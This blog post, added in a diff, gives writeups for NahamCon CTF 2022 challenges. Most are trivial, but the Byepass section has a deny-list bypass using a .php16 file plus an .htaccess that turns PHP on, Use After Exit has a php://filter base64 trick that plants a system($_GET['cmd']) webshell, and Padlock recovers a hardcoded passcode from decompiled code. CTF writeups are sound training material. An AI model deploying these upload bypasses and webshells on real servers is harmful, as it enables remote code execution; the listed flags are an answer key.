@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:conflict]">
+<meta name="description" content="Some writeups for easy/medium challenges from the NahamCon CTF 2022" />
+<meta name="keywords" content="cybersecurity blog french hacking rami malek, ctf, web, re, misc" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/posts/2022/12/nahamcon-ctf-2022-writeups/" />
+
+
+    <title>
+        
+            🇬🇧 NahamCon CTF 2022 (writeups) :: conflict  — cybersecurity blog
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.244183cde1a38e0b08f82c11791181288f9aac1cc9618cd6f4e9e7710c5768ba.css" integrity="sha256-JEGDzeGjjgsI&#43;CwReRGBKI&#43;arBzJYYzW9OnncQxXaLo=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="🇬🇧 NahamCon CTF 2022 (writeups)">
+  <meta itemprop="description" content="Some writeups for easy/medium challenges from the NahamCon CTF 2022">
+  <meta itemprop="datePublished" content="2022-12-22T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2022-12-22T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1616">
+  <meta itemprop="image" content="/">
+  <meta itemprop="keywords" content="Ctf,Web,Re,Misc">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="/">
+  <meta name="twitter:title" content="🇬🇧 NahamCon CTF 2022 (writeups)">
+  <meta name="twitter:description" content="Some writeups for easy/medium challenges from the NahamCon CTF 2022">
+
+
+
+    <meta property="og:url" content="/posts/2022/12/nahamcon-ctf-2022-writeups/">
+  <meta property="og:site_name" content="conflict">
+  <meta property="og:title" content="🇬🇧 NahamCon CTF 2022 (writeups)">
+  <meta property="og:description" content="Some writeups for easy/medium challenges from the NahamCon CTF 2022">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-12-22T00:00:00+00:00">
+    <meta property="article:modified_time" content="2022-12-22T00:00:00+00:00">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Re">
+    <meta property="article:tag" content="Misc">
+    <meta property="og:image" content="/">
+
+
+
+
+
+
+    <meta property="article:published_time" content="2022-12-22 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">-</span>
+            <span class="logo__text ">
+                cnf409</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#527ea9;
+                   animation-duration:0.8s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/contact/">Contact</a></li><li><a href="/htb/">HackTheBox</a></li><li><a href="/posts/">Posts</a></li><li><a href="/series/">Series</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        8 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="/posts/2022/12/nahamcon-ctf-2022-writeups/">🇬🇧 NahamCon CTF 2022 (writeups)</a>
+      </h1>
+
+      
+        <div class="post-excerpt">Some writeups for easy/medium challenges from the NahamCon CTF 2022</div>
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h1 id="technical-support">Technical Support</h1>
+<pre tabindex="0"><code>Author: @JohnHammond#6971
+
+Want to join the party of GIFs, memes and emoji spam? Or just want to ask a question for technical support regarding any challenges in the CTF? Join us in the Discord in the #nahamcon-ctf-general channel! You might just find a flag on the Discord server!
+</code></pre><p>Go on the discord, in the <a href="https://discord.com/channels/598608711186907146/1053097744241283142">#nahamcon-ctf-general</a> channel, and we can see this in the channel description</p>
+<p><img alt="2022-12-17-172256_1335x78_scrot" src="https://user-images.githubusercontent.com/77807503/208268333-6871e3b0-8a49-4c33-bf8d-0766711216c9.png"></p>
+<p>flag → <strong>flag{a98373a74abb8c5ebb8f5192e034a91c}</strong></p>
+<h1 id="babys-first-heartbleed">Baby’s First Heartbleed</h1>
+<pre tabindex="0"><code>Author: @JohnHammond#6971
+
+Hey kids!! Wanna learn how to hack??!?! Start here to foster your curiosity!
+</code></pre><p>Start the machine, and connect to it using nc</p>
+<p><code>⌨️ nc challenge.nahamcon.com 31985</code></p>
+<p>really guessed this one — when he asks for a string just type anything (like “<strong><strong><strong><strong><strong><strong><strong>hello”</strong></strong></strong></strong></strong></strong></strong> for example) and when he asks for a length, type a <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>high number</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<p>You should see the flag appear in the server response:</p>
+<p><img alt="2022-12-17-172914_1888x1032_scrot" src="https://user-images.githubusercontent.com/77807503/208268344-dc135f5b-8bca-43bb-b899-5c3ae30df6bc.png"></p>
+<p>flag → <strong>flag{bfca3d71260e581ba366dca054f5c8e5}</strong></p>
+<h1 id="read-the-rules">Read The Rules</h1>
+<pre tabindex="0"><code>Author: @JohnHammond#6971
+
+Please follow the rules for this CTF!
+</code></pre><p>Go to the <a href="https://ctf.nahamcon.com/rules">rules pages</a> and open up DevTools (or go to view-source) and you should find a comment with the flag at the very bottom of the page’s html</p>
+<p><img alt="2022-12-17-173352_943x617_scrot" src="https://user-images.githubusercontent.com/77807503/208268349-17827a40-0c4c-4502-bb87-ec932abbcd50.png"></p>
+<p>flag → <strong>flag{90bc54705794a62015369fd8e86e557b}</strong></p>
+<h1 id="hashstation">Hashstation</h1>
+<pre tabindex="0"><code>Author: @JohnHammond#6971
+
+Below is a SHA256 hash! Can you determine what the original data was, before it was hashes?
+
+705db0603fd5431451dab1171b964b4bd575e2230f40f4c300d70df6e65f5f1c
+</code></pre><p>You could probably do it with hashcat, but i’m lazy so i’ll just use <a href="http://crackstation.net">crackstation.net</a></p>
+<p><img alt="2022-12-17-190623_1056x434_scrot" src="https://user-images.githubusercontent.com/77807503/208268371-e7fa0ef8-00f3-410f-8696-4396f4945dcf.png"></p>
+<p>flag → <strong><strong><strong><strong><strong>flag{awesome}</strong></strong></strong></strong></strong></p>
+<h1 id="catscii">Catscii</h1>
+<pre tabindex="0"><code>Author: @JohnHammond#6971
+
+Do you know what the cat command does in the Linux command-line?
+</code></pre><p>Download the file and cat its content</p>
+<p><code>⌨️ cat catscii</code></p>
+<p><img alt="2022-12-17-190848_1888x1032_scrot" src="https://user-images.githubusercontent.com/77807503/208268377-98773958-b8a1-4888-8996-1ad12557f7d5.png"></p>
+<p>flag → <strong>flag{258da40ab06be7c99099d603a3b3ccb1}</strong></p>
+<h1 id="banjo">Banjo</h1>
+<pre tabindex="0"><code>Author: @JohnHammond#6971
+
+Oooh, that classic twang! The banjo is one of my favorite strings instruments!
+</code></pre><p>Download the image, and use the <strong><strong><strong><strong><strong><strong><strong>strings</strong></strong></strong></strong></strong></strong></strong> command on it, then <strong><strong><strong><strong>grep flag</strong></strong></strong></strong></p>
+<p><code>⌨️ strings banjo.jpg | grep flag</code></p>
+<p><img alt="2022-12-17-191103_1888x1032_scrot" src="https://user-images.githubusercontent.com/77807503/208268383-2e539cec-5632-4a7d-8594-9a741322edb6.png"></p>
+<p>flag → <strong>flag{ce4e687e575392ae242f0e41c888de11}</strong></p>
+<h1 id="arjeebee">Arjeebee</h1>
+<pre tabindex="0"><code>Author: @JohnHammond#6971
+
+What is the rgb(19,55,175) color in its hexadecimal representation?
+</code></pre><p>Go to <a href="https://www.rgbtohex.net/">rgbtohex.net</a> and enter the RGB values</p>
+<p><img alt="2022-12-17-191342_762x467_scrot" src="https://user-images.githubusercontent.com/77807503/208268387-601be543-3b43-404f-8a2f-8d755ac02d58.png"></p>
+<p>flag → flag{#1337AF}</p>
+<h1 id="way-2-basic">Way 2 Basic</h1>
+<pre tabindex="0"><code>Author: @JohnHammond#6971
+
+Here is some data represented in base 2. What is this data represented as ASCII text?
+
+01100110 01101100 01100001 01100111 01111011 00111001 00110000 01100011 00110110 01100101 01100010 01100101 00111001 00110100 00110001 00110101 00110110 00110001 01100011 01100110 01100001 01100100 01100110 01100001 01100101 00110001 00110111 00110000 01100001 00111000 01100110 00110000 01100101 01100001 00110010 00110101 00110010 01111101
+</code></pre><p>Go to <a href="https://www.rapidtables.com/convert/number/binary-to-ascii.html">any binary to text website</a> (base 2 and binary are the same thing)</p>
+<p><img alt="2022-12-17-191609_646x566_scrot" src="https://user-images.githubusercontent.com/77807503/208268400-4c9af57c-7224-425b-a37e-d734dc4b89fc.png"></p>
+<p>flag → <strong>flag{90c6ebe941561cfadfae170a8f0ea252}</strong></p>
+<h1 id="byepass">Byepass</h1>
+<pre tabindex="0"><code>Author: @JohnHammond#6971
+
+Help yourself Say Goodbye to days gone by with our easy online service! Upload your photos to capture the memory, cherish them with friends and family, and savor the time we have together!
+
+Retrieve the flag out of the root of the filesystem /flag.txt.
+</code></pre><p>Since we have the website’s source code, we can see that there is an upload form at <strong><strong>/save_memories.php</strong></strong></p>
+<p>We can also see which file extentions are blacklisted</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$ext_denylist <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php2&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php3&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php4&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php5&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php6&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php7&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phps&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phps&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pht&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phtm&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phtml&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;pgif&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;shtml&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phar&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;inc&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;hphp&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ctp&#34;</span>,
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>The danger when using blacklists is forgetting something, and that’s what happened here: the <strong><strong><strong><strong><strong><strong>.php16</strong></strong></strong></strong></strong></strong> extention is not filtered</p>
+<p>The challenge’s description tells us that the flag is located in the root of the filesystem, so we can directly try to <strong><strong><strong>cat</strong></strong></strong> it using php</p>
+<p>First, let’s create a <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>exploit.php16</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> file, with our malicious code inside</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat ../../../../../flag.txt&#34;</span>); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Upload it, and read it by going to <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>/exploit.php16</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<p><img alt="2022-12-17-203048_930x1026_scrot" src="https://user-images.githubusercontent.com/77807503/208268408-9edb7538-8a43-4293-9b0c-158781ecb8e7.png"></p>
+<p>aaaaaand… it’s blank</p>
+<p>This can happen for two reasons:</p>
+<ul>
+<li>It did not manage to <strong><strong><strong>cat</strong></strong></strong> the file</li>
+<li>PHP engine is not enabled</li>
+</ul>
+<p>Assuming <strong><strong><strong><strong><strong><strong><strong><strong>flag.txt</strong></strong></strong></strong></strong></strong></strong></strong> exists, it is because the php engine is not enabled</p>
+<p>By looking at the request, we know it’s running Apache, so we can try to upload a <strong><strong><strong><strong><strong><strong><strong><strong><strong>.htaccess</strong></strong></strong></strong></strong></strong></strong></strong></strong> file that will enable <strong><strong><strong>php</strong></strong></strong></p>
+<p>.htaccess:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">AddType</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">httpd</span><span style="color:#f92672">-</span><span style="color:#a6e22e">php</span> <span style="color:#f92672">.</span><span style="color:#a6e22e">php16</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">php_flag</span> <span style="color:#a6e22e">engine</span> <span style="color:#a6e22e">on</span>
+</span></span></code></pre></div><p>Upload dit, and read it by going to <strong><strong><strong>/.htaccess</strong></strong></strong></p>
+<p><img alt="2022-12-17-203816_929x261_scrot" src="https://user-images.githubusercontent.com/77807503/208268411-9a442e5e-2855-4e30-b312-2c42a7dbbedd.png"></p>
+<p>We get a 403 Forbidden response, <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>which is a good sign</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>, because by default, Apache prevents users from reading files such as <strong><strong><strong><strong><strong><strong><strong><strong><strong>.htaccess</strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<p>Now, let’s re-upload our <strong><strong><strong><strong><strong>php16</strong></strong></strong></strong></strong> file</p>
+<p><img alt="2022-12-17-204028_834x171_scrot" src="https://user-images.githubusercontent.com/77807503/208268416-303e5c36-bb7d-4646-b814-83652f92294f.png"></p>
+<p>The PHP is now executed and not read</p>
+<p>flag -&gt; <strong>flag{32697ad7acd2d4718758d9a5ee42965d}</strong></p>
+<h1 id="use-after-exit">Use After Exit</h1>
+<pre tabindex="0"><code>Author: @carlopolop#3938
+
+It&#39;s as easy as it looks, isn&#39;t it?
+</code></pre><p>When we visit the website, we can see the following code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;submit&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $file_name <span style="color:#f92672">=</span> <span style="color:#a6e22e">urldecode</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>]);
+</span></span><span style="display:flex;"><span>    $tmp_path <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;file&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strpos</span>($file_name, <span style="color:#e6db74">&#34;.jpg&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Invalid file name&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($tmp_path);
+</span></span><span style="display:flex;"><span>    $all_content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;?php exit(0);&#39;</span><span style="color:#f92672">.</span> $content <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;?&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>    $handle <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($file_name, <span style="color:#e6db74">&#34;w&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>($handle, $all_content);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($handle);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Done.&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>So we are going to have 2 things to bypass:</p>
+<ul>
+<li>File needs to have .jpg in its name</li>
+<li><code>&lt;?php exit(0); ?&gt;</code> will be written at the beginning of the file</li>
+</ul>
+<p>The first condition is very easy to bypass, since <strong><strong><strong><strong><strong><strong>strpos</strong></strong></strong></strong></strong></strong> checks if “.jpg” is <strong><strong><strong><strong><strong><strong><strong><strong>anywhere</strong></strong></strong></strong></strong></strong></strong></strong> in the file name, not at the end, so we can upload <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>exploit.jpg.php</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<p>The second condition is more annoying, but by reading the <a href="https://www.php.net/manual/en/function.fopen.php">fopen manual</a>, and the <a href="https://www.php.net/manual/en/wrappers.php">supported wrappers page</a>, we understand that we can use <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>php wrappers</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> such as <strong><strong><strong><strong><strong><strong><strong><strong><strong>filter://</strong></strong></strong></strong></strong></strong></strong></strong></strong> inside of the fopen function</p>
+<p>This is useful because if we look at the top of the script, the name of the file is passed through the <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>urldecode()</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> function</p>
+<p>That will allow us to have special characters such as / in our file name</p>
+<p>To prevent the <strong><strong><strong><strong><strong><strong><strong>exit(0)</strong></strong></strong></strong></strong></strong></strong> from bothering us, we will be using the <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>php://filter/convert.base64-decode</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> wrapper, because if we try to decode <strong><!-- raw HTML omitted --></strong> from base64, it gives us this: <strong>^+t</strong>, which is exactly what we want</p>
+<p>Let’s base64 encode a php “webshell”:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8</span><span style="color:#f92672">+</span>
+</span></span></code></pre></div><p>and paste this into a file that we’ll call</p>
+<p><code>⌨️ php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Dshell.jpg.php</code></p>
+<p>that way, when it will be passed through the <strong><strong><strong><strong><strong><strong><strong><strong><strong>urldecode</strong></strong></strong></strong></strong></strong></strong></strong></strong>() function, the filename will look like this</p>
+<p><code>⌨️ php://filter/convert.base64-decode/resource=shell.jpg.php</code></p>
+<p>He will then decode and write this to shell.jpg.php:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">exit</span>(<span style="color:#ae81ff">0</span>); <span style="color:#a6e22e">PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8</span><span style="color:#f92672">+</span> <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>which will look like this atfer decoding</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">^+</span><span style="color:#a6e22e">t</span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#34;cmd&#34;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Now that we’ve got our webshell, we can get the flag from user’s home by navigating to <strong><strong><strong><strong>/shell.jpg.php?cmd=cat ../../../../home/user/flag.txt</strong></strong></strong></strong></p>
+<p><img alt="2022-12-17-202338_930x1026_scrot" src="https://user-images.githubusercontent.com/77807503/208268427-34eaece6-b4cb-4711-bfa4-a0c8a6f4a540.png"></p>
+<p>flag → <strong><strong><strong><strong><strong><strong>flag{ab5f69d6cc412345387a0ca3a4700398}</strong></strong></strong></strong></strong></strong></p>
+<h1 id="padlock">Padlock</h1>
+<pre tabindex="0"><code>Author: @birch#9901
+
+I forgot the combination to my pad lock :(
+</code></pre><p>First step is to run the binary, and see how it acts</p>
+<p><img alt="2022-12-17-230325_551x808_scrot" src="https://user-images.githubusercontent.com/77807503/208268431-b33f5b14-4617-4e3d-9fa1-e91d9cf42ad3.png"></p>
+<p>It asks for a passcode, then probably compares it with the right passcode</p>
+<p>We’ll throw it into IDA, and press <strong><strong>F5</strong></strong> to generate a pseudocode</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">40</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-30h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// [rsp+38h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_lock</span>(<span style="color:#ae81ff">63LL</span>, <span style="color:#ae81ff">63LL</span>, <span style="color:#ae81ff">63LL</span>, <span style="color:#ae81ff">63LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Please enter the passcode: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_fscanf</span>(_bss_start, <span style="color:#e6db74">&#34;%s&#34;</span>, s);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;The passcode you entered was: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">51LL</span>, <span style="color:#ae81ff">101LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">95LL</span>, <span style="color:#ae81ff">32LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">48LL</span>, <span style="color:#ae81ff">111LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">52LL</span>, <span style="color:#ae81ff">97LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strlen</span>(s) <span style="color:#f92672">==</span> <span style="color:#ae81ff">38</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(<span style="color:#e6db74">&#34;master locks arent vry strong are they&#34;</span>, s) )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">101LL</span>, <span style="color:#ae81ff">51LL</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">32LL</span>, <span style="color:#ae81ff">95LL</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">111LL</span>, <span style="color:#ae81ff">48LL</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">replace</span>(s, <span style="color:#ae81ff">97LL</span>, <span style="color:#ae81ff">52LL</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">unlock</span>(s);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Not quite!&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
